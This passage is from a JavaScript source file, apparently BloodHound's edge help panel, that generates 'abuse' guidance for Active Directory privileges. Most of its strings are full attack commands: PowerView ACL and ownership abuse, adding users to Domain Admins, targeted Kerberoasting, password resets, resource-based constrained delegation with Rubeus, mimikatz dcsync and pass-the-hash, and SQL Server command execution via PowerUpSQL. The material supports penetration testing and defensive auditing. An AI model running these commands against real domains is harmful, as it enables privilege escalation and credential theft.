                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>

                Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as ${sourceName}:
                
                <code>Set-DomainObjectOwner -Credential $Cred -TargetIdentity "Domain Admins" -OwnerIdentity harmj0y</code>

                To abuse ownership of a user object, you may grant yourself the AddMember privilege. This can be accomplished using the Add-DomainObjectAcl function in PowerView.
                
                You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
                
                Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
                
                <code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" -Rights WriteMembers</code>
                
                You can now add members to the group using the net binary or PowerView's Add-DomainGroupMember.

                There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally,  you have much safer execution options than you do with spawning net.exe (see the opsec tab).

                To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>

                Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as ${sourceName}:

                <code>Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred</code>

                Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:

                <code>Get-DomainGroupMember -Identity 'Domain Admins'</code>

                Cleanup for this can be done using Remove-DomainObjectAcl
                
                <code>Remove-DomainObjectAcl - Credential $cred -TargetIdentity "Domain Admins" -Rights WriteMembers</code>
                
                Cleanup for the owner can be done by using Set-DomainObjectOwner once again`;
            } else if (targetType === 'User') {
                text = `To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView.

                You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>

                Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as ${sourceName}:
                
                <code>Set-DomainObjectOwner -Credential $Cred -TargetIdentity dfm -OwnerIdentity harmj0y</code>

                To abuse ownership of a user object, you may grant yourself the GenericAll privilege. This can be accomplished using the Add-DomainObjectAcl function in PowerView.
                
                You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
                
                Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
                
                <code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All</code>
                
                <h4> Targeted Kerberoast </h4>
                A targeted kerberoast attack can be performed using PowerView’s Set-DomainObject along with Get-DomainSPNTicket.

                You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>

                Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as ${sourceName}:

                <code>Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}</code>

                After running this, you can use Get-DomainSPNTicket as follows:
                    
                <code>Get-DomainSPNTicket -Credential $Cred harmj0y | fl</code>

                The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:

                <code>Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname</code>

                <h4>Force Change Password </h4>
                There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).

                To abuse this privilege with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>

                Then create a secure string object for the password you want to set on the target user:

                <code>$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force</code>

                Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a process as ${sourceName}:

                <code>Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred</code>

                Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab.
                
                Cleanup of the added ACL can be performed with Remove-DomainObjectAcl:
                
                <code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All</code>
                
                Cleanup for the owner can be done by using Set-DomainObjectOwner once again`;
            } else if (targetType === 'Computer') {
                if (target.haslaps) {
                    text = `To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView.

                    You may need to authenticate to the Domain Controller as ${
                        sourceType === 'User'
                            ? `${sourceName} if you are not running a process as that user`
                            : `a member of ${sourceName} if you are not running a process as a member`
                    }. To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):

                    <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                    $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>

                    Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as ${sourceName}:
                    
                    <code>Set-DomainObjectOwner -Credential $Cred -TargetIdentity windows1 -OwnerIdentity harmj0y</code>
                    
                    To abuse ownership of a computer object, you may grant yourself the GenericAll privilege.
                    
                    You may need to authenticate to the Domain Controller as ${
                        sourceType === 'User'
                            ? `${sourceName} if you are not running a process as that user`
                            : `a member of ${sourceName} if you are not running a process as a member`
                    }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

                    <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                    $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
                    
                    Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
                    
                    <code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>
                    
                    Once you have granted yourself this privilege, you may read the ms-Ads-AdmPwd attribute on the computer object in LDAP which contains the local administrator password.
                    
                    Alternatively, you can perform a resource based constrained delegation attack.

                    Generic write to a computer object can be used to perform a resource based constrained delegation attack. 
                        
                    Abusing this primitive is currently only possible through the Rubeus project.
                
                    First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:
                    
                    <code>New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)</code>
                    
                    PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:
                    
                    <code>$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid</code>
                    
                    We now need to build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE:
                    
                    <code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
                    $SDBytes = New-Object byte[] ($SD.BinaryLength)
                    $SD.GetBinaryForm($SDBytes, 0)</code>
                    
                    Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
                    
                    <code>Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}</code>
                    
                    We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
                    
                    <code>Rubeus.exe hash /password:Summer2018!</code>
                    
                    And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
                    
                    <code>Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt</code>

                    Cleanup can be done using the Remove-DomainObjectAcl function:

                    <code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>
                    
                    Cleanup for the owner can be done by using Set-DomainObjectOwner once again`;
                } else {
                    text = `To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView.

                    You may need to authenticate to the Domain Controller as ${
                        sourceType === 'User'
                            ? `${sourceName} if you are not running a process as that user`
                            : `a member of ${sourceName} if you are not running a process as a member`
                    }. To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):

                    <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                    $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>

                    Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as ${sourceName}:
                    
                    <code>Set-DomainObjectOwner -Credential $Cred -TargetIdentity windows1 -OwnerIdentity harmj0y</code>
                    
                    To abuse ownership of a computer object, you may grant yourself the GenericAll privilege.
                    
                    You may need to authenticate to the Domain Controller as ${
                        sourceType === 'User'
                            ? `${sourceName} if you are not running a process as that user`
                            : `a member of ${sourceName} if you are not running a process as a member`
                    }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

                    <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                    $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
                    
                    Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
                    
                    <code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>
                    
                    Once you have granted yourself this privilege, you can perform a resource based constrained delegation attack.

                    Generic write to a computer object can be used to perform a resource based constrained delegation attack. 
                        
                    Abusing this primitive is currently only possible through the Rubeus project.
                
                    First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:
                    
                    <code>New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)</code>
                    
                    PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:
                    
                    <code>$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid</code>
                    
                    We now need to build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE:
                    
                    <code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
                    $SDBytes = New-Object byte[] ($SD.BinaryLength)
                    $SD.GetBinaryForm($SDBytes, 0)</code>
                    
                    Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
                    
                    <code>Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}</code>
                    
                    We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
                    
                    <code>Rubeus.exe hash /password:Summer2018!</code>
                    
                    And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
                    
                    <code>Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt</code>

                    Cleanup can be done using the Remove-DomainObjectAcl function:

                    <code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>
                    
                    Cleanup for the owner can be done by using Set-DomainObjectOwner once again`;
                }
            } else if (targetType === 'Domain') {
                text = `To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView.

                You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>

                Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as ${sourceName}:
                
                <code>Set-DomainObjectOwner -Credential $Cred -TargetIdentity testlab.local -OwnerIdentity harmj0y</code>
                
                To abuse ownership of a domain object, you may grant yourself the DcSync privileges.
                
                You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
                
                Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
                
                <code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync</code>
                
                Once you have granted yourself this privilege, you may use the mimikatz dcsync function to dcsync the password of arbitrary principals on the domain

                <code>sekurlsa::dcsync /domain:testlab.local /user:Administrator</code>
                
                Cleanup can be done using the Remove-DomainObjectAcl function:
                <code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync</code>
                
                Cleanup for the owner can be done by using Set-DomainObjectOwner once again`;
            } else if (targetType === 'GPO') {
                text = `To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView.

                You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>

                Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as ${sourceName}:
                
                <code>Set-DomainObjectOwner -Credential $Cred -TargetIdentity TestGPO -OwnerIdentity harmj0y</code>
                
                To abuse ownership of a domain object, you may grant yourself the DcSync privileges.
                
                You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
                
                Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
                
                <code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All</code>
                
                With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse
                
                Cleanup can be done using the Remove-DomainObjectAcl function:
                <code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All</code>
                
                Cleanup for the owner can be done by using Set-DomainObjectOwner once again`;
            }
            formatted = text;
        } else if (edge.label === 'CanRDP') {
            let text = `Abuse of this privilege will depend heavily on the type of access you have. 
            
            <h4>PlainText Credentials with Interactive Access</h4>
            With plaintext credentials, the easiest way to exploit this privilege is using the built in Windows Remote Desktop Client (mstsc.exe). Open mstsc.exe and input the computer ${targetName}. When prompted for credentials, input the credentials for ${
                sourceType === 'Group'
                    ? `a member of ${sourceName}`
                    : `${sourceName}`
            } to initiate the remote desktop connection.

            <h4>Password Hash with Interactive Access</h4>
            With a password hash, exploitation of this privilege will require local administrator privileges on a system, and the remote server must allow Restricted Admin Mode. 

            First, inject the NTLM credential for the user you're abusing into memory using mimikatz:
            
            <code>sekurlsa::pth /user:dfm /domain:testlab.local /ntlm:&lt;ntlm hash&gt; /run:"mstsc.exe /restrictedadmin"</code>

            This will open a new RDP window. Input the computer ${targetName} to initiate the remote desktop connection. If the target server does not support Restricted Admin Mode, the session will fail.

            <h4>Plaintext Credentials without Interactive Access</h4>
            This method will require some method of proxying traffic into the network, such as the socks command in cobaltstrike, or direct internet connection to the target network, as well as the xfreerdp (suggested because of support of Network Level Authentication (NLA)) tool, which can be installed from the freerdp-x11 package. If using socks, ensure that proxychains is configured properly. Initiate the remote desktop connection with the following command:

            <code>(proxychains) xfreerdp /u:dfm /d:testlab.local /v:&lt;computer ip&gt;</code>

            xfreerdp will prompt you for a password, and then initiate the remote desktop connection.

            <h4>Password Hash without Interactive Access</h4>
            This method will require some method of proxying traffic into the network, such as the socks command in cobaltstrike, or direct internet connection to the target network, as well as the xfreerdp (suggested because of support of Network Level Authentication (NLA)) tool, which can be installed from the freerdp-x11 package. Additionally, the target computer must allow Restricted Admin Mode. If using socks, ensure that proxychains is configured properly. Initiate the remote desktop connection with the following command:

            <code>(proxychains) xfreerdp /pth:&lt;ntlm hash&gt; /u:dfm /d:testlab.local /v:&lt;computer ip&gt;</code>

            This will initiate the remote desktop connection, and will fail if Restricted Admin Mode is not enabled.`;
            formatted = text;
        } else if (edge.label === 'ExecuteDCOM') {
            let text = `The PowerShell script Invoke-DCOM implements lateral movement using a variety of different COM objects (ProgIds: MMC20.Application, ShellWindows, ShellBrowserWindow, ShellBrowserWindow, and ExcelDDE).  LethalHTA implements lateral movement using the HTA COM object (ProgId: htafile).  

            One can manually instantiate and manipulate COM objects on a remote machine using the following PowerShell code.  If specifying a COM object by its CLSID:
            
            $ComputerName = ${targetName}  # Remote computer
            $clsid = “{fbae34e8-bf95-4da8-bf98-6c6e580aa348}”      # GUID of the COM object
            $Type = [Type]::GetTypeFromCLSID($clsid, $ComputerName)
            $ComObject = [Activator]::CreateInstance($Type)
            
            If specifying a COM object by its ProgID:
            
            $ComputerName = ${targetName}  # Remote computer
            $ProgId = “<NAME>”      # GUID of the COM object
            $Type = [Type]::GetTypeFromProgID($ProgId, $ComputerName)
            $ComObject = [Activator]::CreateInstance($Type)
            `;
            formatted = text.format(sourceType, sourceName, targetName);
        } else if (edge.label === 'AllowedToDelegate') {
            let text = `Abusing this privilege can utilize Benjamin Delpy’s Kekeo project, proxying in traffic generated from the Impacket library, or using the Rubeus project's s4u abuse.

            In the following example, *victim* is the attacker-controlled account (i.e. the hash is known) that is configured for constrained delegation. That is, *victim* has the "HTTP/PRIMARY.testlab.local" service principal name (SPN) set in its msds-AllowedToDelegateTo property. The command first requests a TGT for the *victim* user and executes the S4U2self/S4U2proxy process to impersonate the "admin" user to the "HTTP/PRIMARY.testlab.local" SPN. The alternative sname "cifs" is substituted in to the final service ticket and the ticket is submitted to the current logon session. This grants the attacker the ability to access the file system of PRIMARY.testlab.local as the "admin" user.

            <code>Rubeus.exe s4u /user:victim /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:admin /msdsspn:"HTTP/PRIMARY.testlab.local" /altservice:cifs /ptt</code>`;
            formatted = text.format(sourceType, sourceName, targetName);
        } else if (edge.label === 'GetChanges') {
            let text = `With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz:
            
            <code>sekurlsa::dcsync /domain:testlab.local /user:Administrator</code>
            
            You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blod post by harmj0y in the references tab.`;
            formatted = text;
        } else if (edge.label === 'GetChangesAll') {
            let text = `With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz:
            
            <code>sekurlsa::dcsync /domain:testlab.local /user:Administrator</code>
            
            You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blod post by harmj0y in the references tab.`;
            formatted = text;
        } else if (edge.label === 'ReadLAPSPassword') {
            let text = `To abuse this privilege with PowerView's Get-DomainObject, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as ${
                sourceType === 'User'
                    ? `${sourceName} if you are not running a process as that user`
                    : `a member of ${sourceName} if you are not running a process as a member`
            }. To do this in conjunction with Get-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):

            <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
            $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>

            Then, use Get-DomainObject, optionally specifying $Cred if you are not already running a process as ${sourceName}:

            Get-DomainObject windows1 -Credential $Cred -Properties "ms-mcs-AdmPwd",name`;
            formatted = text;
        } else if (edge.label === 'Contains') {
            formatted = `There is no abuse info related to this edge.`;
        } else if (edge.label === 'GpLink') {
            formatted = `There is no abuse info related to this edge.`;
        } else if (edge.label === 'AddAllowedToAct') {
            formatted = `Abusing this primitive is currently only possible through the Rubeus project.
            
            First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:
            
            <code>New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)</code>
            
            PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:
            
            <code>$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid</code>
            
            We now need to build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE:
            
            <code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
            $SDBytes = New-Object byte[] ($SD.BinaryLength)
            $SD.GetBinaryForm($SDBytes, 0)</code>
            
            Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
            
            <code>Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}</code>
            
            We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
            
            <code>Rubeus.exe hash /password:Summer2018!</code>
            
            And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
            
            <code>Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt</code>`;
        } else if (edge.label === 'AllowedToAct') {
            formatted = `Abusing this primitive is currently only possible through the Rubeus project.
            
            To use this attack, the controlled account MUST have a service principal name set, along with access to either the plaintext or the RC4_HMAC hash of the account.

            If the plaintext password is available, you can hash it to the RC4_HMAC version using Rubeus:

            <code>Rubeus.exe hash /password:Summer2018!</code>            
            
            Use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
            
            <code>Rubeus.exe s4u /user:${sourceName}$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt</code>`;
        } else if (edge.label === 'SQLAdmin') {
            formatted = `Scott Sutherland (<a href="https://twitter.com/_nullbind">@nullbind</a>) from NetSPI has authored PowerUpSQL, a PowerShell Toolkit for Attacking SQL Server. Major contributors include Antti Rantasaari, Eric Gruber (<a href="https://twitter.com/egru">@egru</a>), and Thomas Elling (<a href="https://github.com/thomaselling">@thomaselling</a>). Before executing any of the below commands, download PowerUpSQL and laod it into your PowerShell instance. Get PowerUpSQL here: <a href="https://github.com/NetSPI/PowerUpSQL">https://github.com/NetSPI/PowerUpSQL</a>.

                <h4>Finding Data</h4>
                Get a list of databases, sizes, and encryption status:
                
                <code>Get-SQLDatabaseThreaded –Verbose -Instance sqlserver\instance –Threads 10 -NoDefaults</code>
                
                Search columns and data for keywords:
                
                <code>Get-SQLColumnSampleDataThreaded –Verbose -Instance sqlserver\instance –Threads 10 –Keyword “card, password” –SampleSize 2 –ValidateCC -NoDefaults | ft -AutoSize</code>
                
                <h4>Executing Commands</h4>
                Below are examples of PowerUpSQL functions that can be used to execute operating system commands on remote systems through SQL Server using different techniques.  The level of access on the operating system will depend largely what privileges are provided to the service account.  However, when domain accounts are configured to run SQL Server services, it is very common to see them configured with local administrator privileges.
                
                xp_cmdshell Execute Example:
                
                <code>Invoke-SQLOSCmd -Verbose -Command "Whoami" -Threads 10 -Instance sqlserver\instance</code>
                
                Agent Job Execution Examples:
                
                <code>Invoke-SQLOSCmdAgentJob -Verbose -SubSystem CmdExec -Command "echo hello > c:\windows\temp\test1.txt" -Instance sqlserver\instance -username myuser -password mypassword</code>
                
                <code>Invoke-SQLOSCmdAgentJob -Verbose -SubSystem PowerShell -Command 'write-output "hello world" | out-file c:\windows\temp\test2.txt' -Sleep 20 -Instance sqlserver\instance -username myuser -password mypassword</code>
                
                <code>Invoke-SQLOSCmdAgentJob -Verbose -SubSystem VBScript -Command 'c:\windows\system32\cmd.exe /c echo hello > c:\windows\temp\test3.txt' -Instance sqlserver\instance -username myuser -password mypassword</code>
                
                <code>Invoke-SQLOSCmdAgentJob -Verbose -SubSystem JScript -Command 'c:\windows\system32\cmd.exe /c echo hello > c:\windows\temp\test3.txt' -Instance sqlserver\instance -username myuser -password mypassword</code>
                
                Python Subsystem Execution:
                <code>Invoke-SQLOSPython -Verbose -Command "Whoami" -Instance sqlserver\instance</code>
                R subsystem Execution Example
                
                <code>Invoke-SQLOSR -Verbose -Command "Whoami" -Instance sqlserver\instance</code>
                OLE Execution Example
                
                <code>Invoke-SQLOSOle -Verbose -Command "Whoami" -Instance sqlserver\instance</code>
                CLR Execution Example
                
                <code>Invoke-SQLOSCLR -Verbose -Command "Whoami" -Instance sqlserver\instance</code>
                
                Custom Extended Procedure Execution Example:
                1. Create a custom extended stored procedure.
                <code>Create-SQLFileXpDll -Verbose -OutFile c:\temp\test.dll -Command "echo test > c:\temp\test.txt" -ExportName xp_test</code>
                
                2. Host the test.dll on a share readable by the SQL Server service account. 
                <code>Get-SQLQuery -Verbose -Query "sp_addextendedproc 'xp_test', '\\yourserver\yourshare\myxp.dll'" -Instance sqlserver\instance</code>
                
                3. Run extended stored procedure
                <code>Get-SQLQuery -Verbose -Query "xp_test" -Instance sqlserver\instance</code>
                
                4. Remove extended stored procedure.
                <code>Get-SQLQuery -Verbose -Query "sp_dropextendedproc 'xp_test'" -Instance sqlserver\instance</code>
                
                Author: Scott Sutherland`;
        }

        this.setState({ abuseTabContent: { __html: formatted } });
    }

    createOpsecTab(edge, source, target) {
        let sourceType = source.type;
        let sourceName = encode(source.label);
        let targetType = target.type;
        let targetName = encode(target.label);
        let formatted;
        if (edge.label === 'AdminTo') {
